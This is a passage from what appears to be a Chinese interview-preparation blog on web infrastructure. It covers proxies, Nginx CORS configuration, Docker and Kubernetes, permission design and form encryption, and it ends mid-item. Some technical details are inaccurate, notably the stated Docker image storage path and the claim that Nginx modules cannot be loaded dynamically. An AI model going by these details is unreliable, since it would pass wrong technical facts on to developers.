id="2、什么是正向代理和反向代理？"><a href="#2、什么是正向代理和反向代理？" class="headerlink" title="2、什么是正向代理和反向代理？"></a>2、什么是正向代理和反向代理？</h3><p>正向代理（Forward Proxy）和反向代理（Reverse Proxy）是两种不同类型的代理服务器。它们在网络架构中发挥着重要的作用，具体来说：</p><ol><li>正向代理： 正向代理位于客户端与目标服务器之间，充当客户端与目标服务器之间的中间人。客户端发起请求时，请求首先到达正向代理服务器，然后代理服务器将请求转发到目标服务器。正向代理的主要作用包括：</li></ol><ul><li>为内部网络客户端提供对外部资源的访问能力</li><li>提供缓存功能，加速对常用资源的访问</li><li>对客户端身份进行匿名化</li><li>实现负载均衡</li><li>实施安全策略和访问控制</li></ul><ol><li>反向代理： 反向代理位于客户端与目标服务器之间，充当目标服务器与客户端之间的中间人。客户端发起请求时，请求首先到达反向代理服务器，然后代理服务器将请求转发到后端服务器。反向代理的主要作用包括：</li></ol><ul><li>提供负载均衡，将客户端请求分发到多个后端服务器</li><li>提供SSL加密和解密功能，实现安全通信</li><li>提供缓存功能，加速对常用资源的访问</li><li>实现应用服务器的隔离，保护后端服务器免受恶意攻击</li><li>集中处理和监控客户端请求，实现统一的访问控制和安全策略</li></ul><p>简言之，正向代理主要面向客户端，帮助客户端访问互联网上的资源；反向代理主要面向服务器，帮助服务器处理来自客户端的请求。</p><h5 id="Proxy如何解决跨域"><a href="#Proxy如何解决跨域" class="headerlink" title="Proxy如何解决跨域"></a>Proxy如何解决跨域</h5><p>代理（Proxy）是一种常见的跨域解决方案之一，特别是在服务器端编程或部署服务器的环境中。代理服务器充当了客户端和目标服务器之间的中间人，它接收客户端的请求并将其转发到目标服务器，然后将目标服务器的响应返回给客户端。通过代理服务器，可以绕过浏览器的同源策略，从而实现跨域请求。</p><p>以下是使用代理解决跨域请求的基本步骤：</p><ol><li><p><strong>设置代理服务器：</strong> 首先，你需要在服务器端设置一个代理服务器，这个服务器将接收来自客户端的请求并将其代理到目标服务器。这可以是一个独立的服务器或已有的Web服务器的一部分。</p></li><li><p><strong>客户端发送请求：</strong> 客户端向代理服务器发送请求，而不是直接向目标服务器发送请求。客户端的请求应该包含目标服务器的URL和所需的参数。</p></li><li><p><strong>代理服务器转发请求：</strong> 代理服务器接收到客户端的请求后，将其转发到目标服务器。这个过程涉及到从客户端接收请求、构建目标服务器请求、发送目标服务器请求、接收目标服务器响应等步骤。</p></li><li><p><strong>目标服务器响应：</strong> 目标服务器处理代理服务器发送的请求，并生成响应数据。响应数据将被发送回代理服务器。</p></li><li><p><strong>代理服务器返回响应：</strong> 代理服务器将目标服务器的响应返回给客户端。客户端接收到响应后，可以处理响应数据。</p></li></ol><p>使用代理服务器的主要优点包括：</p><ul><li><p><strong>绕过同源策略：</strong> 代理服务器允许客户端从不同域的目标服务器请求数据，绕过了浏览器的同源策略限制。</p></li><li><p><strong>灵活性：</strong> 代理服务器可以在客户端和目标服务器之间执行逻辑，例如添加身份验证、数据转换或其他处理。</p></li><li><p><strong>服务器端控制：</strong> 代理服务器是在服务器端运行的，因此可以更容易地进行监视、管理和维护。</p></li><li><p><strong>安全性：</strong> 代理服务器可以用于隐藏客户端的IP地址，从而提高安全性。</p></li></ul><p>需要注意的是，设置代理服务器需要一定的服务器管理和维护工作。此外，代理服务器不适用于所有跨域场景，特别是在客户端编写的纯前端应用中，可能更适合使用其他跨域解决方案，如CORS（跨域资源共享）。</p><h3 id="3、Nginx"><a href="#3、Nginx" class="headerlink" title="3、Nginx"></a>3、Nginx</h3><h5 id="为什么Nginx性能这么高？"><a href="#为什么Nginx性能这么高？" class="headerlink" title="为什么Nginx性能这么高？"></a>为什么Nginx性能这么高？</h5><p>Nginx 的高性能可以归因于其独特的设计和架构。以下是 Nginx 高性能的关键因素：</p><ol><li>事件驱动、异步非阻塞架构：Nginx 使用了事件驱动的异步非阻塞 I&#x2F;O 模型。这种模型允许 Nginx 在单个进程中处理大量并发连接，而无需为每个连接创建一个新的线程或进程。这大大降低了上下文切换和内存分配的开销，提高了性能。</li><li>轻量级：Nginx 的代码量较小，安装和配置简单，占用资源较少。这使得 Nginx 在处理请求时能够更高效地利用系统资源。</li><li>高效的静态文件处理：Nginx 对静态文件的处理能力非常出色，它可以利用 sendfile 系统调用、TCP_CORK 和 TCP_NOPUSH 套接字选项等高级 I&#x2F;O 功能，以高效地为静态资源提供服务。</li><li>Keep-Alive 连接：Nginx 支持 HTTP Keep-Alive 连接，这意味着多个请求可以在同一连接上进行，减少了连接建立和关闭的开销。</li><li>内建的负载均衡和反向代理：Nginx 提供了功能强大的反向代理和负载均衡功能，可以在多个后端服务器之间分发请求，提高整体性能。</li><li>缓存功能：Nginx 提供了缓存功能，可以将后端服务器的响应进行缓存，加速对常用资源的访问，减轻后端服务器的负担。</li><li>可扩展性：Nginx 支持模块化扩展，用户可以根据需要添加功能模块，定制 Nginx 以满足特定需求。</li><li>稳定性：Nginx 的稳定性非常高，即使在高负载情况下也能保持稳定运行。这使得 Nginx 能够在生产环境中提供可靠的服务。</li></ol><p>这些因素共同使得 Nginx 成为一个高性能的 Web 服务器和反向代理服务器。其优异的性能表现吸引了许多大型网站和互联网公司将 Nginx 作为首选的 Web 服务器和反向代理服务器。</p><h5 id="Nginx的优缺点？Nginx应用场景？"><a href="#Nginx的优缺点？Nginx应用场景？" class="headerlink" title="Nginx的优缺点？Nginx应用场景？"></a>Nginx的优缺点？Nginx应用场景？</h5><p>Nginx 是一个高性能、轻量级的 Web 服务器和反向代理服务器。它广泛用于网站和网络应用的开发，其优缺点如下：</p><p>优点：</p><ol><li>高性能：Nginx 使用事件驱动的异步非阻塞架构，可以支持大量并发连接。相较于其他传统服务器，例如 Apache，Nginx 在并发场景下具有更低的资源消耗和更高的性能。</li><li>轻量级：Nginx 的代码量较小，安装和配置简单，占用资源较少。</li><li>反向代理：Nginx 提供了功能强大的反向代理功能，可以实现负载均衡、缓存、SSL 加密解密等。</li><li>静态文件处理：Nginx 对静态文件的处理能力非常出色，能高效地为静态资源提供服务。</li><li>可扩展性：Nginx 支持模块化扩展，用户可以根据需要添加功能模块。</li><li>稳定性高：Nginx 有着很高的稳定性，被广泛应用于生产环境。</li></ol><p>缺点：</p><ol><li>动态语言支持较弱：与 Apache 相比，Nginx 对动态语言的支持不够完善，通常需要与其他应用服务器（如 PHP-FPM、uWSGI 等）配合使用。</li><li>模块更新和扩展：Nginx 模块需要在编译时集成，无法像 Apache 那样通过动态加载模块。当需要更新或添加模块时，通常需要重新编译 Nginx。</li><li>社区支持：虽然 Nginx 社区不断发展，但与 Apache 等老牌 Web 服务器相比，其社区支持相对较弱。</li></ol><p>Nginx 应用场景：</p><ol><li>静态资源服务器：Nginx 非常擅长处理静态文件，如图片、CSS、JavaScript 等。在很多场景下，Nginx 作为静态资源服务器可以减轻应用服务器的负担，提高响应速度。</li><li>反向代理和负载均衡：Nginx 提供了强大的反向代理和负载均衡功能，可以将客户端请求分发到多个后端服务器，提高服务的可用性和扩展性。</li><li>SSL 终端：Nginx 支持 SSL&#x2F;TLS 加密和解密，可作为 HTTPS 服务的终端，保证数据的安全传输。</li><li>缓存服务器：Nginx 可以作为缓存服务器，对后端服务器的响应进行缓存，加速对常用资源的访问，提高用户体验。</li><li>Web 应用服务器：虽然 Nginx 对动态语言支持的不足，但它仍然可以与其他应用服务器（如 PHP-FPM、uWSGI 等）配合使用，共同组成 Web 应用的整体架构。例如，Nginx 可以作为反向代理服务器，将动态请求转发给 PHP-FPM 处理，同时负责静态文件的处理。</li></ol><p>总之，Nginx 的高性能、轻量级和稳定性使其在众多应用场景中得到广泛应用，特别是在处理静态文件、反向代理和负载均衡等方面表现出色。然而，对于动态语言支持和模块扩展方面，Nginx 仍然需要与其他应用服务器配合使用以获得更好的效果。</p><h5 id="如何用Nginx解决前端跨域问题？"><a href="#如何用Nginx解决前端跨域问题？" class="headerlink" title="如何用Nginx解决前端跨域问题？"></a>如何用Nginx解决前端跨域问题？</h5><p>要使用 Nginx 解决前端跨域问题，您可以通过配置 Nginx 为您的 Web 服务添加 CORS（跨域资源共享）相关的响应头。以下是一个简单的示例，展示如何在 Nginx 配置文件中实现 CORS 配置：</p><ol><li><p>打开 Nginx 配置文件，通常位于 <code>/etc/nginx/nginx.conf</code> 或 <code>/etc/nginx/sites-available/your_site_config</code>。</p></li><li><p>在配置文件中找到您想要添加 CORS 支持的 <code>location</code> 块。如果没有，您可以创建一个。</p></li><li><p>在 <code>location</code> 块中添加以下配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">location / &#123;<br>    # ...原有配置...<br><br>    # 添加<span class="hljs-variable constant_">CORS</span>相关的响应头<br>    <span class="hljs-keyword">if</span> ($request_method = <span class="hljs-string">&#x27;OPTIONS&#x27;</span>) &#123;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="hljs-string">&#x27;GET, POST, OPTIONS&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="hljs-string">&#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Max-Age&#x27;</span> <span class="hljs-number">1728000</span>;<br>        add_header <span class="hljs-string">&#x27;Content-Type&#x27;</span> <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Content-Length&#x27;</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">204</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ($request_method = <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="hljs-string">&#x27;GET, POST, OPTIONS&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="hljs-string">&#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Expose-Headers&#x27;</span> <span class="hljs-string">&#x27;Content-Length,Content-Range&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个示例中，我们为 <code>OPTIONS</code> 请求和 <code>GET</code> 请求添加了 CORS 相关的响应头。您可以根据实际需求调整允许的请求方法和其他配置。</p></li><li><p>保存配置文件并重新加载 Nginx 以使更改生效：</p></li></ol><p>现在，Nginx 已经为您的 Web 服务添加了 CORS 支持，应该可以解决前端跨域问题。请注意，上面的示例中使用了通配符 <code>*</code> 作为 <code>Access-Control-Allow-Origin</code> 的值，这意味着允许所有域进行跨域访问。在实际生产环境中，您可能需要将其替换为特定的域名以提高安全性。</p><h3 id="4、谈谈你对Docker的理解"><a href="#4、谈谈你对Docker的理解" class="headerlink" title="4、谈谈你对Docker的理解"></a>4、谈谈你对Docker的理解</h3><p>Docker是一个开源的容器平台，它可以帮助开发者和运维人员轻松地打包、分发和运行应用。它基于容器化技术，让应用程序和其依赖环境作为一个整体打包在一起，实现了环境与应用程序的隔离。Docker的核心思想是将应用程序与底层基础设施分离，从而使开发和部署过程更加简单、高效和可靠。</p><p>Docker的主要特点包括：</p><ol><li>轻量级：Docker使用容器来运行应用，这些容器共享宿主机的操作系统内核，因此容器的开销小于虚拟机。它们启动快速，占用的资源更少。</li><li>易于打包和分发：Docker可以将应用程序及其依赖项一起打包成一个镜像，这使得应用程序可以在不同的环境中轻松移植和复制。Docker Hub等仓库提供了便利的镜像分发和管理。</li><li>隔离性：每个容器运行在自己的命名空间中，拥有独立的文件系统、网络和进程空间，这意味着容器之间相互隔离，可以在同一台机器上运行多个互不干扰的应用。</li><li>可扩展性：Docker支持容器的水平扩展和垂直扩展，可以根据需要快速添加或删除容器实例，以应对不同的负载需求。</li><li>DevOps友好：Docker支持持续集成与持续部署（CI&#x2F;CD），使得开发、测试和生产环境更加统一，有助于提高开发和运维团队的协作效率。</li><li>生态系统丰富：Docker拥有庞大的社区和丰富的插件生态系统，包括Docker Compose、Docker Swarm、Kubernetes等，这些工具可以帮助用户更好地管理和协调多个容器。</li></ol><p>总之，Docker是一个强大的容器化技术平台，它使应用程序的开发、部署和运维更加简单、高效和可靠。</p><h5 id="Docker如何批量清理临时镜像文件？"><a href="#Docker如何批量清理临时镜像文件？" class="headerlink" title="Docker如何批量清理临时镜像文件？"></a>Docker如何批量清理临时镜像文件？</h5><p>在Docker中，可以使用以下命令批量清理临时镜像文件：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">docker image prune -a<br></code></pre></td></tr></table></figure><p>该命令将删除所有未被使用的镜像和标签。如果你只想删除未被使用的镜像，可以使用以下命令：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">docker image prune<br></code></pre></td></tr></table></figure><h5 id="Docker本地的镜像文件都存放在哪里？"><a href="#Docker本地的镜像文件都存放在哪里？" class="headerlink" title="Docker本地的镜像文件都存放在哪里？"></a>Docker本地的镜像文件都存放在哪里？</h5><p>在 Docker 中，本地的镜像文件存储在 Docker 的文件系统中，一般位于宿主机的<code>/var/lib/docker</code>目录下。在该目录下有多个子目录和文件，其中比较重要的有：</p><ul><li><code>containers/</code>：存储容器的文件系统和元数据。</li><li><code>image/</code>：存储镜像文件和元数据。</li><li><code>volumes/</code>：存储 Docker 卷的数据。</li><li><code>networks/</code>：存储 Docker 网络的配置和状态。</li></ul><p>在<code>image/</code>目录下，有一个子目录<code>overlay2/</code>（在使用 overlay2 存储驱动的情况下），它包含了所有的镜像文件和元数据，每个镜像对应一个目录。例如，如果有一个名为<code>nginx:latest</code>的镜像，则它的文件存储路径为<code>/var/lib/docker/image/overlay2/&lt;hash&gt;/merged/</code>，其中<code>&lt;hash&gt;</code>是镜像的 SHA256 哈希值。</p><p>请注意，这些路径可能因为 Docker 版本、存储驱动等因素而有所不同。如果想要确定本地 Docker 存储的路径，可以使用以下命令查看 Docker 的配置信息：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> <span class="hljs-literal">info</span><br></code></pre></td></tr></table></figure><p>其中会列出 Docker 存储的根目录和数据子目录。</p><h5 id="Docker如何停止所有正在运行的容器？"><a href="#Docker如何停止所有正在运行的容器？" class="headerlink" title="Docker如何停止所有正在运行的容器？"></a>Docker如何停止所有正在运行的容器？</h5><p>要停止所有正在运行的容器，可以使用以下命令：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker stop <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure><p>该命令使用<code>docker ps -q</code>命令列出所有正在运行的容器的 ID，然后将其传递给<code>docker stop</code>命令以停止这些容器。这样就可以一次性停止所有正在运行的容器。</p><p>如果你希望删除所有停止的容器，可以使用以下命令：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">docker <span class="hljs-built_in">container</span> prune<br></code></pre></td></tr></table></figure><p>该命令将删除所有已经停止的容器。请注意，这些命令将永久删除容器，因此在使用之前请确保你确实想要删除这些容器。</p><h5 id="构建Docker镜像应该遵循哪些原则？"><a href="#构建Docker镜像应该遵循哪些原则？" class="headerlink" title="构建Docker镜像应该遵循哪些原则？"></a>构建Docker镜像应该遵循哪些原则？</h5><p>构建Docker镜像时，应遵循一些原则以保证镜像的高质量、安全性和可维护性。以下是一些建议：</p><ol><li>使用官方基础镜像：尽可能使用官方提供的基础镜像，因为它们经过了广泛测试且得到了良好的支持。</li><li>保持镜像轻量化：减少镜像大小，只包含运行应用程序所需的最小依赖。这将提高镜像的传输速度和部署时间。</li><li>使用多阶段构建：通过多阶段构建，可以在一个Dockerfile中使用多个构建阶段，以便更有效地处理构建过程。这有助于减少镜像大小和优化构建时间。</li><li>缩小镜像攻击面：确保镜像中只包含必要的组件，避免安装不必要的软件包，以降低安全风险。</li><li>使用.dockerignore文件：使用.dockerignore文件排除不需要的文件和目录，以减小镜像大小并加快构建速度。</li><li>标签和版本控制：为镜像使用清晰、有意义的标签，并进行版本控制。这有助于跟踪和管理不同版本的镜像。</li><li>缓存和层次化：充分利用Docker构建缓存，并将Dockerfile中的指令合理分层。这有助于加速构建过程并提高可维护性。</li><li>设置适当的用户权限：避免使用root用户运行容器，以降低潜在的安全风险。</li><li>指定资源限制：设置适当的资源限制，如CPU和内存，以防止容器消耗过多宿主机资源。</li><li>文档化：为Dockerfile和镜像提供清晰的文档，以便其他人了解如何使用和维护它们。</li></ol><p>遵循这些原则有助于创建高质量、安全且易于维护的Docker镜像。</p><h5 id="谈谈你对Docker-Compose的理解"><a href="#谈谈你对Docker-Compose的理解" class="headerlink" title="谈谈你对Docker-Compose的理解"></a>谈谈你对Docker-Compose的理解</h5><p>Docker Compose是一个用于定义和运行多容器Docker应用程序的工具。它允许用户使用YAML文件（通常命名为<code>docker-compose.yml</code>）来描述一个完整的应用程序环境，包括服务、网络和卷等配置。通过Docker Compose，开发者可以轻松地管理复杂的多容器应用，实现一键式启动、停止和重新部署。</p><p>以下是Docker Compose的一些主要特点：</p><ol><li>服务定义：使用YAML语法定义应用程序的各个服务。每个服务都基于一个Docker镜像，并且可以配置其端口映射、环境变量、依赖关系等。</li><li>网络管理：Docker Compose允许用户定义应用程序内部的网络，以便实现服务之间的隔离和通信。默认情况下，Docker Compose会创建一个网络，并将所有服务连接到该网络。</li><li>卷管理：Docker Compose支持定义和管理持久化存储卷，以便在容器之间共享数据。这对于数据库等需要持久化存储的应用非常有用。</li><li>依赖管理：Docker Compose可以管理服务之间的依赖关系，确保服务按照正确的顺序启动和关闭。这可以通过<code>depends_on</code>关键字来实现。</li><li>一键操作：使用<code>docker-compose up</code>命令，可以一次性启动定义在YAML文件中的所有服务。同样地，<code>docker-compose down</code>命令可以一次性停止所有服务。</li><li>开发和生产环境配置：Docker Compose支持使用多个YAML文件来覆盖和扩展配置，这使得开发者可以针对开发、测试和生产环境使用不同的配置。</li></ol><p>Docker Compose大大简化了多容器应用程序的管理，使开发者可以专注于编写应用程序代码，而无需关心底层的容器管理和编排。然而，需要注意的是，虽然Docker Compose适用于开发和测试环境，但在生产环境中，可能需要更强大的容器编排工具，如Kubernetes。</p><h5 id="谈谈你对K8S的理解"><a href="#谈谈你对K8S的理解" class="headerlink" title="谈谈你对K8S的理解"></a>谈谈你对K8S的理解</h5><p>Kubernetes（简称K8s）是一个开源的容器编排平台，旨在自动化部署、扩展和管理容器化应用程序。它最初由Google开发，后来成为Cloud Native Computing Foundation（CNCF）的一部分。Kubernetes提供了一种声明式的方式来描述应用程序的部署和运行状态，使得复杂的容器化应用程序可以在多个主机上进行分布式部署和管理。</p><p>以下是Kubernetes的一些主要特点：</p><ol><li>高可用性：Kubernetes支持容器在集群的不同节点上进行分布式部署，以实现负载均衡和故障转移。这有助于提高应用程序的可用性和性能。</li><li>水平可扩展：Kubernetes可以根据负载需求自动扩展或缩减容器实例数量。这可以通过Deployment资源中的副本数（Replicas）进行配置。</li><li>自我修复：Kubernetes监控容器状态，当容器出现故障时，它可以自动重新启动容器、替换容器或重新调度容器到其他节点上，从而确保应用程序始终处于健康状态。</li><li>声明式配置：Kubernetes使用YAML或JSON文件描述应用程序的部署和运行状态，这些配置文件可以与源代码一起存储和管理，从而实现基础设施即代码（Infrastructure as Code）。</li><li>服务发现和负载均衡：Kubernetes提供了内置的服务发现和负载均衡机制，可以将流量自动分发到不同的容器实例上，以实现高可用性和性能。</li><li>存储管理：Kubernetes支持多种持久化存储解决方案，如NFS、iSCSI、GlusterFS等。它允许用户为容器动态配置和管理持久化存储卷。</li><li>密钥和配置管理：Kubernetes可以管理应用程序的敏感信息（如密码、密钥等）和配置文件，使得这些信息可以在不同的容器实例之间安全地共享。</li><li>强大的生态系统：Kubernetes拥有丰富的插件和扩展生态系统，例如Helm（用于包管理）、Prometheus（用于监控）等，这些工具可以帮助用户更好地管理和监控Kubernetes集群。</li></ol><p>总之，Kubernetes是一个功能强大的容器编排平台，它提供了一种高度自动化和可扩展的方式来管理容器化应用程序。尽管Kubernetes的学习曲线较陡峭，但对于大型、复杂的应用程序，它是一个非常有价值的工具。</p><h2 id="特定场景篇"><a href="#特定场景篇" class="headerlink" title="特定场景篇"></a>特定场景篇</h2><h3 id="1、怎么实现一个简单的多人协作文档编辑功能"><a href="#1、怎么实现一个简单的多人协作文档编辑功能" class="headerlink" title="1、怎么实现一个简单的多人协作文档编辑功能"></a>1、怎么实现一个简单的多人协作文档编辑功能</h3><p>实现一个简单的多人协作文档编辑功能涉及多个方面的技术和组件，包括实时通信、文本同步、用户管理等。下面是一个基本的步骤和示例技术栈，帮助你开始构建这样的功能：</p><ol><li><p><strong>创建基本的文档编辑器：</strong> 首先，你需要创建一个文档编辑器，用户可以在其中编辑文本。你可以使用现有的富文本编辑器库（如Quill.js、TinyMCE等）来简化这个过程。</p></li><li><p><strong>实时通信：</strong> 为了实现多人协作，你需要一个实时通信机制，让所有用户之间的更改能够及时同步。WebSocket 是一种常见的选择，它允许双向通信，使得服务器可以推送数据给所有客户端。</p></li><li><p><strong>文本同步：</strong> 当用户在编辑器中进行更改时，这些更改需要同步到其他用户。你可以使用 Operational Transformation (OT) 或 Conflict-free Replicated Data Types (CRDTs) 等算法来处理多人同时编辑的情况。</p></li><li><p><strong>用户管理：</strong> 需要一种方式来管理用户并跟踪他们的编辑状态。每个用户应该有一个唯一的标识符，以便在同步时确定哪个用户做了什么更改。</p></li><li><p><strong>后端服务器：</strong> 你需要一个后端服务器来处理 WebSocket 连接、文本同步和用户管理。Node.js、Python（使用框架如Django或Flask）、Ruby（使用框架如Ruby on Rails）等都可以用于创建后端服务器。</p></li><li><p><strong>前端界面：</strong> 创建一个前端界面，让用户可以进入编辑会话并查看其他用户的更改。你可以使用框架如React、Vue.js、Angular等来构建前端界面。</p></li></ol><p>以下是一个基本示例，演示了使用 Node.js、WebSocket 和 Quill.js 创建一个简单的多人协作文档编辑器的基本思路：</p><ul><li>使用 Node.js 创建一个 WebSocket 服务器，处理用户连接和文本同步。</li><li>在前端使用 Quill.js 创建文本编辑器。</li><li>当用户进行更改时，将更改发送到服务器，服务器广播更改给所有其他用户。</li><li>在前端接收来自服务器的更改并在编辑器中应用它们。</li></ul><p>这只是一个起点，实现一个稳定的多人协作文档编辑器需要更多的工作和考虑，特别是在处理同步和冲突解决方面。此外，还需要考虑用户权限、安全性、持久化存储等方面的问题。如果你打算在生产环境中使用这样的功能，可能需要考虑使用成熟的协作工具或服务，而不是自行构建。</p><p>最重要的是，在构建这样的功能时，需要考虑到性能、可伸缩性和用户体验，以确保用户能够顺畅地协作编辑文档</p><h3 id="2、权限设计"><a href="#2、权限设计" class="headerlink" title="2、权限设计"></a>2、权限设计</h3><p>权限设计是在应用程序中定义和管理用户对资源和功能的访问权限的过程。良好的权限设计可以确保应用程序的安全性，同时提供用户所需的功能。以下是一些关于权限设计的关键考虑因素和最佳实践：</p><ol><li><p><strong>身份认证（Authentication）：</strong> 用户必须在应用程序中进行身份认证，以确定他们是谁。常见的身份认证方法包括用户名密码、令牌（Token）、单点登录（SSO）、OAuth等。</p></li><li><p><strong>授权（Authorization）：</strong> 授权是根据用户身份和角色确定用户对资源和功能的访问权限的过程。权限可以分为以下几个方面：</p><ul><li><strong>角色和权限管理：</strong> 角色是一组相关的权限集合，可以将用户分配给不同的角色。例如，管理员、普通用户、编辑者等。权限则是与特定操作或资源相关的控制点。</li><li><strong>基于角色的授权：</strong> 常见的做法是将用户分配给角色，然后将权限与角色相关联。这样，用户的权限取决于他们的角色。</li><li><strong>基于资源的授权：</strong> 有时候，权限可能需要更精确地分配到特定的资源上。例如，某个用户只能编辑自己创建的文章。</li></ul></li><li><p><strong>细粒度控制：</strong> 在权限设计中，要考虑到权限的细粒度，即确定哪些操作是受限的，以及哪些数据是受限的。这可以通过明确定义权限和资源的组合来实现。</p></li><li><p><strong>动态权限管理：</strong> 有些权限可能需要在运行时动态管理。这可能涉及到基于特定条件（如用户属性或上下文）的权限动态分配。</p></li><li><p><strong>审计和日志：</strong> 记录用户的操作和访问可以帮助检测潜在的安全问题和非法行为。审计和日志功能对于安全性至关重要。</p></li><li><p><strong>界面设计：</strong> 对于权限管理，用户界面设计也很重要。用户应该能够清楚地了解他们的权限，以及如何请求或修改权限。</p></li><li><p><strong>安全漏洞：</strong> 在权限设计中要小心处理潜在的安全漏洞，如跨站点请求伪造（CSRF）、越权访问等。</p></li><li><p><strong>测试和漏洞扫描：</strong> 对权限系统进行全面的测试，包括单元测试、集成测试和漏洞扫描，以确保它的安全性和稳定性。</p></li><li><p><strong>定期审查和更新：</strong> 权限设计不是一次性完成的任务，它需要定期审查和更新，以适应应用程序的变化和新的安全挑战。</p></li><li><p><strong>遵循最佳实践：</strong> 最后，确保遵循安全最佳实践，如避免硬编码的密钥、加密敏感数据、限制错误信息的泄漏等。</p></li></ol><p>总之，权限设计是应用程序安全的关键组成部分。合理的权限设计可以保护用户数据和系统安全，同时提供流畅的用户体验。在设计权限系统时，综合考虑用户需求、角色管理、资源控制和安全性等因素是至关重要的。</p><h5 id="路由权限怎么做的？要是想实现篡改用户权限的话怎么办？"><a href="#路由权限怎么做的？要是想实现篡改用户权限的话怎么办？" class="headerlink" title="路由权限怎么做的？要是想实现篡改用户权限的话怎么办？"></a>路由权限怎么做的？要是想实现篡改用户权限的话怎么办？</h5><p>在前端应用中实现路由权限控制是一种重要的安全措施，它可以确保用户只能访问其具有权限的页面。以下是一些常见的路由权限控制的做法：</p><ol><li><p><strong>路由配置：</strong> 在应用中定义路由时，可以为每个路由配置一个权限标志，表示哪些用户具有访问权限。例如，可以将权限标志存储在路由对象的元数据中。</p></li><li><p><strong>路由守卫（Route Guards）：</strong> 使用路由守卫来控制用户是否可以访问特定路由。在路由守卫中，可以检查用户的权限并决定是否允许导航到该路由。在 Vue.js 中，可以使用 <code>beforeEach</code> 钩子，在 Angular 中，可以使用 <code>CanActivate</code> 守卫，在 React 中，可以使用 <code>react-router</code> 中的 <code>Route</code> 组件的 <code>render</code> 属性。</p></li><li><p><strong>动态加载路由：</strong> 将路由配置信息从服务器动态获取，根据用户的权限来生成路由。这样可以确保用户只能看到他们有权限访问的路由。</p></li><li><p><strong>角色和权限系统：</strong> 实现一个角色和权限系统，为用户分配不同的角色，并将角色与路由权限进行关联。然后，在路由守卫中检查用户的角色是否具有访问特定路由的权限。</p></li><li><p><strong>Token 鉴权：</strong> 将用户的身份验证令牌（Token）包含在每个请求中，并在服务器端验证令牌的有效性和用户的权限。服务器可以拒绝无效令牌或没有权限的请求。</p></li><li><p><strong>前端鉴权：</strong> 除了在服务器端进行权限验证外，还可以在前端进行一些基本的权限检查，以提高用户体验。例如，在前端路由守卫中检查用户是否有权限访问某个页面，并在没有权限时重定向到其他页面或显示错误信息。</p></li><li><p><strong>加密和签名：</strong> 使用加密和签名技术来保护路由配置和权限信息，以防止用户篡改权限。这可以在一定程度上增加安全性。</p></li></ol><p>要防止用户篡改权限，需要在服务器端进行权限验证，不仅依赖前端的控制。前端的权限控制主要是为了提供更好的用户体验和安全性，但不应作为唯一的安全层。</p><p>总之，路由权限控制是一项重要的前端安全措施，可以通过合理的路由配置和路由守卫来实现。但最终的安全性依赖于服务器端的权限验证和数据保护措施。要确保系统的安全性，前后端应该共同合作，建立全面的安全策略。</p><h3 id="3、表单加密解密"><a href="#3、表单加密解密" class="headerlink" title="3、表单加密解密"></a>3、表单加密解密</h3><p>表单加密和解密通常涉及敏感数据的处理，以确保数据在传输和存储时的安全性。以下是一些关于表单加密和解密的基本概念和流程：</p><p><strong>加密（Encryption）：</strong> 加密是将明文数据转换为密文数据的过程，以防止未经授权的访问。在Web表单中，通常使用加密来保护用户输入的敏感数据（例如密码、信用卡号等）。</p><p><strong>解密（Decryption）：</strong> 解密是将加密的密文数据还原为明文数据的过程，以便应用程序能够使用这些数据进行处理。</p><p>以下是一些常见的表单加密和解密的方式：</p><ol><li><p><strong>HTTPS：</strong> 对于大多数Web应用程序，最简单和最安全的方式是使用HTTPS协议。HTTPS使用加密技术来加密在浏览器和服务器之间传输的数据，包括表单数据。这确保了数据在传输过程中不会被拦截或窃听。</p></li><li><p><strong>前端加密（Client-Side Encryption）：</strong> 有时，可以在浏览器端对表单数据进行加密，然后再将加密后的数据传输到服务器。这可以使用JavaScript库来实现，例如CryptoJS。但请注意，前端加密通常不如HTTPS安全，因为密钥可能会在客户端暴露，容易受到攻击。</p></li><li><p><strong>服务器端加密（Server-Side Encryption）：</strong> 